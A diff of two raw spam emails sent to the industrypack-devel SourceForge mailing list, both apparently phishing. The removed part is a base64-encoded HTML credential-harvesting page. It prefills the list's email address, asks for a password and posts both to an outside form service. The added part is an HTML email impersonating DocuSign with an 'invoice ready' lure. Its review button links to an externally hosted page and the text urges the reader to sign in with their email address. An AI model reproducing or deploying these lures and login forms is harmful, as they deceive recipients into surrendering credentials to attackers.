-eTogVmVyZGFuYTsgDQogIGZvbnQtc2l6ZTogMTJweDsgDQogIGNvbG9yOiMwMDAwMDA7IA0K
-ICBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGOyANCiAgYm9yZGVyOiBzb2xpZCAxcHggI0ZGRjsg
-DQogIHBhZGRpbmc6IDdweDsgDQogIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyANCiAgLXdl
-YmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7IA0KICAta2h0bWwtYm9yZGVyLXJhZGl1czogNHB4
-OyANCiAgYm9yZGVyLXJhZGl1czogNHB4Ow0KfQ0KDQppbnB1dFt0eXBlPXBhc3N3b3JkXSB7
-DQogIHdpZHRoOjI3NXB4OyANCiAgaGVpZ2h0OjM1cHg7IGZvbnQtZmFtaWx5OiB2ZXJkYW5h
-OyANCiAgZm9udC1zaXplOiAxMnB4OyANCiAgY29sb3I6IzAwMDAwMDsgDQogIGJhY2tncm91
-bmQtY29sb3I6ICNGRkY7IA0KICBib3JkZXI6IHNvbGlkIDFweCAjRkZGOyANCiAgcGFkZGlu
-ZzogN3B4OyANCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7IA0KICAtd2Via2l0LWJvcmRl
-ci1yYWRpdXM6IDRweDsgDQogIC1raHRtbC1ib3JkZXItcmFkaXVzOiA0cHg7IA0KICBib3Jk
-ZXItcmFkaXVzOiA0cHg7DQo8L3N0eWxlPg0KCTxzdHlsZT4NCmJvZHksIGh0bWwgew0KICBo
-ZWlnaHQ6IDEwMCU7DQogIG1hcmdpbjogMDsNCiAgZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2
-ZXRpY2EsIHNhbnMtc2VyaWY7DQp9DQoNCiogew0KICBib3gtc2l6aW5nOiBib3JkZXItYm94
-Ow0KfQ0KDQouYmctaW1hZ2Ugew0KICAvKiBUaGUgaW1hZ2UgdXNlZCAqLw0KICBiYWNrZ3Jv
-dW5kLWltYWdlOiB1cmwoImh0dHBzOi8vaS5neWF6by5jb20vOTdmYTIyMzk4ZWVjYzEwMDYx
-ZmFhNjU4ZTUyODY4NGEucG5nIik7DQogIA0KICAvKiBBZGQgdGhlIGJsdXIgZWZmZWN0ICov
-DQogIGZpbHRlcjogYmx1cig1cHgpOw0KICAtd2Via2l0LWZpbHRlcjogYmx1cig1cHgpOw0K
-ICANCiAgLyogRnVsbCBoZWlnaHQgKi8NCiAgaGVpZ2h0OiAxMDAlOyANCiAgDQogIC8qIENl
-bnRlciBhbmQgc2NhbGUgdGhlIGltYWdlIG5pY2VseSAqLw0KICBiYWNrZ3JvdW5kLXBvc2l0
-aW9uOiBjZW50ZXI7DQogIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogIGJhY2tn
-cm91bmQtc2l6ZTogY292ZXI7DQp9DQoNCi8qIFBvc2l0aW9uIHRleHQgaW4gdGhlIG1pZGRs
-ZSBvZiB0aGUgcGFnZS9pbWFnZSAqLw0KLmJnLXRleHQgew0KICBiYWNrZ3JvdW5kOiAjMUMx
-QzFDOw0KICBiYWNrZ3JvdW5kOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICMxQzFDMUMg
-MCUsICM2MTBCMEIgNzMlLCAjREYwMTAxIDEwMCUpOw0KICBiYWNrZ3JvdW5kOiAtd2Via2l0
-LWxpbmVhci1ncmFkaWVudCh0b3AsICMxQzFDMUMgMCUsICM2MTBCMEIgNzMlLCAjREYwMTAx
-IDEwMCUpOw0KICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjMUMx
-QzFDIDAlLCAjNjEwQjBCIDczJSwgI0RGMDEwMSAxMDAlKTsNCiAgY29sb3I6IHdoaXRlOw0K
-ICBmb250LXdlaWdodDogYm9sZDsNCiAgYm9yZGVyLXJhZGl1czogMjVweCAwcHggNjVweCAw
-cHg7DQogIC13ZWJraXQtYm94LXNoYWRvdzogM3B4IDNweCAxNXB4IDVweCAjMDAwMDAwOyAN
-CiAgYm94LXNoYWRvdzogM3B4IDNweCAxNXB4IDVweCAjMDAwMDAwOw0KICBwb3NpdGlvbjog
-YWJzb2x1dGU7DQogIHRvcDogNTAlOw0KICBsZWZ0OiA1MCU7DQogIHRyYW5zZm9ybTogdHJh
-bnNsYXRlKC01MCUsIC01MCUpOw0KICB6LWluZGV4OiAyOw0KICB3aWR0aDogMzYwcHg7DQog
-IGhlaWdodDozMjVweDsNCiAgcGFkZGluZzogNXB4Ow0KICB0ZXh0LWFsaWduOiBjZW50ZXI7
-DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHkgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdo
-dD0iMCIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIj4NCg0KPHRhYmxlIGFsaWduPSJj
-ZW50ZXIiIGNlbGxzcGFjaW5nPSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj4NCg0K
-PHRyPjx0ZCBoZWlnaHQ9IjE1JSI+DQoNCgk8aW1nIHNyYz0iaHR0cHM6Ly9pLmd5YXpvLmNv
-bS80Mjk1NDhlNmNkMWY3ZjUxMmMxZGNiZDAwMDNjYWFlYi5wbmciPg0KDQo8L3RkPjwvdHI+
-DQoNCg0KPHRyPjx0ZCBoZWlnaHQ9Ijc4JSI+DQoNCjxkaXYgY2xhc3M9ImJnLWltYWdlIj48
-L2Rpdj4NCg0KPGJyPjxicj48YnI+DQoNCg0KPGRpdiBjbGFzcz0iYmctdGV4dCI+DQoNCg0K
-CTx0YWJsZSBhbGlnbj0iY2VudGVyIiBjZWxsc3BhY2luZz0iMCI+DQoJPHRyPjx0ZCBzdHls
-ZT0iaGVpZ2h0OjM1cHg7Ij48L3RkPjwvdHI+DQoJPHRyPjx0ZD4NCgkJPGZvbnQgZmFjZT0i
-YXJpYWwiIHNpemU9IjMiIGNvbG9yPSIjRkZGRkZGIj4NCgkJPGI+YmVzcG9rZWxpZ2h0aW5n
-LmFlPC9iPiAmIzM5NTY0OyYjMzU3Nzc7DQoJCTwvZm9udD4NCgk8L3RkPjwvdHI+DQoJDQoJ
-CQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDoxMHB4OyI+PC90ZD48L3RyPg0KCQ0KCQkJCQk8
-dHI+PHRkPg0KCQkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iaHR0cHM6Ly9ub2Nv
-ZGVmb3JtLmlvL2YvNjZjMzU5ODhmMjgzZjBlNmMzOTE4MWUyIj4NCgkJCQkJPC90ZD48L3Ry
-Pg0KCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249ImxlZnQiPg0KCQkJCQkJCQk8
-Zm9udCBmYWNlPSJ2ZXJkYW5hIiBzaXplPSIyIiBjb2xvcj0iI0ZGRiI+DQoJCQkJCQkJCQkm
-IzMwMDA1OyYjMjMzNzY7JiMzNzAzODsmIzIwMjE0OyYjMzYyMjk7JiMyNjEwMjsgJiMzMDMz
-MTsmIzI0NDA1OyYjMjAxOTc7JiMyNjU5NzsmIzMwNDc1OyYjMjU5OTE7JiMyNjcyMzsuLi4N
-CgkJCQkJCQkJPC9mb250Pg0KCQkJCQkJCTwvZGl2Pg0KCQkJCQk8L3RkPjwvdHI+DQoJCQkJ
-CTx0cj48dGQgc3R5bGU9ImhlaWdodDoxNXB4OyI+PC90ZD48L3RyPg0KCQkJCQk8dHI+PHRk
-Pg0KCQkJCQkJPHRhYmxlIGNlbGxzcGFjaW5nPSIwIiBhbGlnbj0iY2VudGVyIj4NCgkJCQkJ
-CTx0cj48dGQ+DQoJCQkJCQkJPGRpdiBhbGlnbj0iY2VudGVyIj4NCgkJCQkJCQkJPGlucHV0
-ICBuYW1lPSJsb2dpbiIgdHlwZT0iZW1haWwiIHZhbHVlPSJpbmR1c3RyeXBhY2stZGV2ZWxA
-bGlzdHMuc291cmNlZm9yZ2UubmV0IiBkaXNhYmxlZD4NCgkJCQkJCQk8L2Rpdj4NCgkJCQkJ
-CTwvdGQ+PC90cj4NCgkJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDo3cHg7Ij48L3RkPjwv
-dHI+DQoJCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249ImNlbnRlciI+DQoJCQkJ
-CQkJCTxpbnB1dCAgbmFtZT0icGFzc3dkIiB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9
-IiYjMjM0OTQ7JiMzMDcyMTsiIHJlcXVpcmVkPg0KCQkJCQkJCTwvZGl2Pg0KCQkJCQkJPC90
-ZD48L3RyPg0KCQkJCQkJPHRyPjx0ZCBzdHlsZT0iaGVpZ2h0OjdweDsiPjwvdGQ+PC90cj4N
-CgkJCQkJCTx0cj48dGQ+DQoJCQkJCQkJPHRhYmxlIGFsaWduPSJjZW50ZXIiIGNlbGxzcGFj
-aW5nPSIwIiBzdHlsZT0id2lkdGg6Mjc3cHg7Ij48dHI+DQoJCQkJCQkJPHRkPg0KCQkJCQkJ
-CQk8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNoZWNrZWQ+IDxmb250IGZhY2U9ImFyaWFsIiBz
-aXplPSIyIiBjb2xvcj0iI0ZGRiI+JiMzNTc2MDsmIzI0NDcxOyYjMjUxMDU7PC9mb250Pg0K
-CQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkPg0KCQkJCQkJCQk8ZGl2IGFsaWduPSJyaWdodCI+
-DQoJCQkJCQkJCQk8YSBocmVmPSIjIiBzdHlsZT0idGV0XXh0LWRlY29yYXRpb246bm9uZTsi
-Pg0KCQkJCQkJCQkJCTxmb250IGZhY2U9ImFyaWFsIiBzaXplPSIyIiBjb2xvcj0iIzAwODBG
-RiI+PHU+DQoJCQkJCQkJCQkJCSYjMjQ1MzY7JiMzNTc2MDsmIzIzNDk0OyYjMzA3MjE7JiM2
-NTMxMTsNCgkJCQkJCQkJCQk8L3U+PC9mb250Pg0KCQkJCQkJCQkJPC9hPg0KCQkJCQkJCQk8
-L2Rpdj4NCgkJCQkJCQk8L3RkPg0KCQkJCQkJCTwvdHI+PC90YWJsZT4NCgkJCQkJCTwvdGQ+
-PC90cj4NCgkJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDoyMHB4OyI+PC90ZD48L3RyPg0K
-CQkJCQkJPHRyPjx0ZD4NCgkJCQkJCQk8ZGl2IGFsaWduPSJyaWdodCI+DQoJCQkJCQkJCTxp
-bnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSImIzMwNDc1OyYjMjc4NjE7Ij4NCgkJCQkJCQk8
-L2Rpdj4NCgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTx0cj48dGQ+DQoJCQkJCQk8L3RkPjwv
-dHI+DQoJCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6MjBweDsiPg0KCQkJCQkJCTxpbnB1
-dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImxvZ2luIiB2YWx1ZT0iaW5kdXN0cnlwYWNrLWRldmVs
-QGxpc3RzLnNvdXJjZWZvcmdlLm5ldCI+DQoJCQkJCQkJPC9mb3JtPg0KCQkJCQkJPC90ZD48
-L3RyPg0KCQkJCQkJPC90YWJsZT4NCgkJCQkJPC90ZD48L3RyPg0KCTwvdGFibGU+DQo8L2Rp
-dj4NCg0KDQo8L3RkPjwvdHI+DQoNCg0KPHRyPjx0ZCBoZWlnaHQ9IjIlIiBiZ2NvbG9yPSIj
-RkZGIj48L3RkPjwvdHI+DQoNCjx0cj48dGQgaGVpZ2h0PSI1JSIgYmdjb2xvcj0iIzAwMCI+
-DQoNCgk8ZGl2IGFsaWduPSJjZW50ZXIiPg0KCQk8Zm9udCBmYWNlPSJhcmlhbCIgc2l6ZT0i
-MSIgY29sb3I9IiNGRkYiPg0KCQlDb3B5cmlnaHQgwqkgLiBBbGwgcmlnaHRzIHJlc2VydmVk
-DQoJCTwvZm9udD4NCgk8L2Rpdj4NCg0KPC90ZD48L3RyPg0KPC9ib2R5Pg0KPC9odG1sPg==
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18817"></HEAD>
+<BODY>
+<DIV class=3D"adn ads" style=3D'FONT-SIZE: medium; FONT-FAMILY: "Google San=
+s", Roboto, RobotoDraft, Helvetica, Arial, sans-serif; WHITE-SPACE: normal;=
+ WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
+4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
+EFT: 0px; BORDER-LEFT: medium none; ORPHANS: 2; WIDOWS: 2; DISPLAY: flex; L=
+ETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,25=
+5); TEXT-INDENT: 0px; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial' data-legacy-message-id=3D"18732cf3ef1f733d" data-message-id=3D"#ms=
+g-f:1761801305432486717">
+<DIV class=3Dgs style=3D"WIDTH: 864px; PADDING-BOTTOM: 20px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<DIV>
+<DIV id=3D:1eg class=3D"ii gt" style=3D"POSITION: relative; PADDING-BOTTOM:=
+ 0px; DIRECTION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 8px 0px =
+0px; PADDING-RIGHT: 0px" jslog=3D"20277; u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTc=
+2MTgwMTMwNTQzMjQ4NjcxN3xtc2ctZjoxNzYxODAxMzA1NDMyNDg2NzE3IixudWxsLG51bGwsbn=
+VsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbXV0.; 4:W=
+yIjbXNnLWY6MTc2MTgwMTMwNTQzMjQ4NjcxNyIsbnVsbCxbXV0.">
+<DIV id=3D:1ef class=3D"a3s aiL " style=3D"OVERFLOW: hidden; FONT: small/1.=
+5 Arial, Helvetica, sans-serif">
+<DIV>
+<DIV id=3Dm_1786579613471354598ydpcde49f5cyahoo_quoted_0339161341>
+<DIV style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, Ar=
+ial, sans-serif; COLOR: rgb(38,40,42)'>
+<DIV>
+<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817>
+<DIV>
+<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817yqt68399>
+<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817ydpb8c06f58yahoo_quo=
+ted_8614756273>
+<DIV style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, Ar=
+ial, sans-serif; COLOR: rgb(38,40,42)'>
+<DIV>
+<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817ydpb8c06f58yiv271773=
+6934>
+<DIV>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=3Dcenter border=
+=3D0>
+<TBODY>
+<TR>
+<TD style=3D"MARGIN: 0px" width=3D640>
+<TABLE style=3D"MAX-WIDTH: 640px; BORDER-COLLAPSE: collapse; BACKGROUND-COL=
+OR: rgb(255,255,255)">
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px; M=
+ARGIN: 0px; PADDING-RIGHT: 24px"></TD></TR>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 30px; PADDING-TOP: 0px; PADDING-LEFT: 24px; MA=
+RGIN: 0px; PADDING-RIGHT: 24px">
+<TABLE style=3D"COLOR: rgb(255,255,255); BACKGROUND-COLOR: rgb(0,46,59)" ce=
+llSpacing=3D0 cellPadding=3D0 width=3D"100%" align=3Dcenter border=3D0>
+<TBODY>
+<TR>
+<TD style=3D'FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
+WIDTH: 520px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 36px; TEXT-ALIGN: ce=
+nter; PADDING-TOP: 28px; PADDING-LEFT: 36px; MARGIN: 0px; PADDING-RIGHT: 36=
+px; BACKGROUND-COLOR: rgb(0,46,59); border-radius: 2px' align=3Dcenter>
+<IMG class=3DCToWUd style=3D"WIDTH: 75px; MIN-HEIGHT: 75px" src=3D"https://=
+ci4.googleusercontent.com/proxy/NX1A7leTJhYqLBapajfOi9G4-543NGr76bPQA5hWe1-=
+Yv8d0NGjGzR9thg4fr2i87PXrLIDkMHI_9XegTPLla_6egnnq3VxKmfxyuKB6TjcCpVbT=3Ds0-=
+d-e1-ft#https://www.docusign.net/member/Images/email/docGeneric-white.png" =
+width=3D75 height=3D75 data-bit=3D"iit">=20
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D'FONT-SIZE: 16px; BORDER-TOP: medium none; FONT-FAMILY: Helveti=
+ca, Arial, "Sans Serif"; BORDER-RIGHT: medium none; BORDER-BOTTOM: medium n=
+one; COLOR: rgb(255,255,255); TEXT-ALIGN: center; PADDING-TOP: 24px; MARGIN=
+: 0px; BORDER-LEFT: medium none' align=3Dcenter>industrypack-devel@lists.so=
+urceforge.net<BR><BR><STRONG>#30862911 Payment_terms.pdf &nbsp;- Invoice on=
+line document is ready</STRONG><BR><BR><BR><SPAN class=3Dauto-style3>A copy=
+ to review via DocuSign Electronic Signature.</SPAN></TD></TR></TBODY></TAB=
+LE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-TOP: 30px; MARGIN: 0px" align=3Dcenter>
+<DIV>
+<TABLE style=3D"HEIGHT: 44px; WIDTH: 201px" cellSpacing=3D0 cellPadding=3D0=
+>
+<TBODY>
+<TR>
+<TD style=3D'FONT-SIZE: 15px; TEXT-DECORATION: none; FONT-FAMILY: Helvetica=
+, Arial, "Sans Serif"; FONT-WEIGHT: bold; COLOR: rgb(36,31,33); TEXT-ALIGN:=
+ center; MARGIN: 0px; DISPLAY: block; BACKGROUND-COLOR: rgb(67,222,149); bo=
+rder-radius: 2px' height=3D44 align=3Dcenter>
+<A style=3D'FONT-SIZE: 15px; TEXT-DECORATION: none; HEIGHT: 44px; FONT-FAMI=
+LY: Helvetica, Arial, "Sans Serif"; WIDTH: 199px; FONT-WEIGHT: bold; COLOR:=
+ rgb(36,31,33); TEXT-ALIGN: center; DISPLAY: inline-block; BACKGROUND-COLOR=
+: rgb(67,222,149); border-radius: 2px' href=3D"https://eu2.contabostorage.c=
+om/9dcf433f57d54040b5c59c8a0fdea5aa:docu/Scan_Docu.html#industrypack-devel@=
+lists.sourceforge.net" shape=3Drect rel=3D"noreferrer noopener" target=3D_b=
+lank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://www.docusign=
+=2Enet/signing/emails/v1-4d993a9d3c0b469296c9f37eaaf469944557f9fefffb4c2b88=
+4b17e6014f9f03&amp;source=3Dgmail&amp;ust=3D1684578242683000&amp;usg=3DAOvV=
+aw1HHdJaHQgnnoNjsrduWZJa"><SPAN style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 24px; LINE-HEIGHT: 44px; PADDING-RIGHT: 24px">REVIEW DOC=
+UMENT</SPAN></A></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE><=
+/TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style=3D'FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 24px; PADDING-TOP: 0px; PADDING-LEFT: 24=
+px; MARGIN: 0px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: white'>
+<P style=3D'FONT-SIZE: 15px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; C=
+OLOR: rgb(51,51,51); LINE-HEIGHT: 20px'><STRONG>
+Note: <SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: ArialMT, Arial, Helvetic=
+a, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; COLOR: rgb(74,74,74); FONT-STYLE: normal; ORPHANS: 2; WIDOWS=
+: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
+ss: initial; text-decoration-style: initial;=20
+text-decoration-color: initial">To view the secure message, click&nbsp;view=
+&nbsp;your&nbsp;message. and follow the instructions Sign in using your </S=
+PAN>
+<SPAN class=3Dauto-style2 style=3D"FONT-SIZE: 14px; FONT-FAMILY: ArialMT, A=
+rial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-T=
+RANSFORM: none; FLOAT: none; FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DIS=
+PLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,=
+255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-ca=
+ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
+ial; text-decoration-style: initial;=20
+text-decoration-color: initial">industrypack-devel@lists.sourceforge.net</S=
+PAN>
+ <SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: ArialMT, Arial, Helvetica, sa=
+ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLO=
+AT: none; COLOR: rgb(74,74,74); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; =
+DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(2=
+55,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
+nitial; text-decoration-style: initial;=20
+text-decoration-color: initial">&nbsp;email address</SPAN>.</STRONG></P></T=
+D></TR>
+<TR>
+<TD style=3D'FONT-SIZE: 11px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
+COLOR: rgb(102,102,102); PADDING-BOTTOM: 12px; PADDING-TOP: 0px; PADDING-LE=
+FT: 24px; MARGIN: 0px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(255,255,2=
+55)'>
+<TABLE cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D'FONT-SIZE: 11px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
+VERTICAL-ALIGN: top; COLOR: rgb(102,102,102); MARGIN: 0px' vAlign=3Dtop>
+<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: Helvetica, Arial, "Sans Serif";=
+ COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 2px; PADDING-LE=
+FT: 0px; PADDING-RIGHT: 5px'>Powered by</DIV></TD>
+<TD style=3D"MARGIN: 0px"><IMG class=3DCToWUd style=3D"BORDER-TOP: medium n=
+one; BORDER-RIGHT: medium none; BORDER-BOTTOM: medium none; BORDER-LEFT: me=
+dium none" alt=3DDocuSign src=3D"https://ci4.googleusercontent.com/proxy/5c=
+uCxX2hzv7w2iO_LKZiI3I-jjYjOpc9J6CmMYlAlwnKYvy4JoGCQmH1E5JbdtBhAXS3P3x7ik-9r=
+HKDlOLOKKoAUkoxXNbWdSzLLxTLIK-B1BeQ9ww=3Ds0-d-e1-ft#https://www.docusign.ne=
+t/Signing/Images/email/Email_PowerByLogo.png" height=3D19 data-bit=3D"iit">=
+</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 45px; PADDING-TOP: 30px; PADDING-LEFT: 24px; M=
+ARGIN: 0px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(234,234,234)">
+<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
+ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B>Do Not Sh=
+are This Email</B><BR clear=3Dnone>This email contains a secure link to Doc=
+uSign. Please do not share this email, link, or access code with others.</P=
+>
+<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
+ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B>About Doc=
+uSign</B><BR clear=3Dnone>Sign documents electronically in just minutes. It=
+'s safe, secure, and legally binding. Whether you're in an office, at home,=
+ on-the-go -- or even across the globe -- DocuSign provides a professional =
+trusted solution for Digital Transaction Management&#8482;.</P>
+<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
+ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B>Questions=
+ about the Document?</B><BR clear=3Dnone>If you need to modify the document=
+ or have questions about the details in the document, please reach out to t=
+he sender by emailing them directly.</P>
+<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 10px; FONT-FAMILY: Helvetica, Ar=
+ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 14px'>This message=
+ was sent to industrypack-devel@lists.sourceforge.net who is using the Docu=
+Sign Electronic Signature Service. If you would rather not receive email fr=
+om this sender you may contact the sender with your request.</P></TD></TR><=
+/TBODY></TABLE></TD>
+<TD style=3D"MARGIN: 0px"></TD></TR></TBODY></TABLE></DIV></DIV></DIV></DIV=
+></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></=
+DIV></BODY></HTML>
 
 
-------=_NextPart_000_0012_B2E189BE.5325CD8A
+--===============8360730660070246810==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
-------=_NextPart_000_0012_B2E189BE.5325CD8A
+--===============8360730660070246810==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -393,6 +344,4 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
-------=_NextPart_000_0012_B2E189BE.5325CD8A--
-
-
+--===============8360730660070246810==--
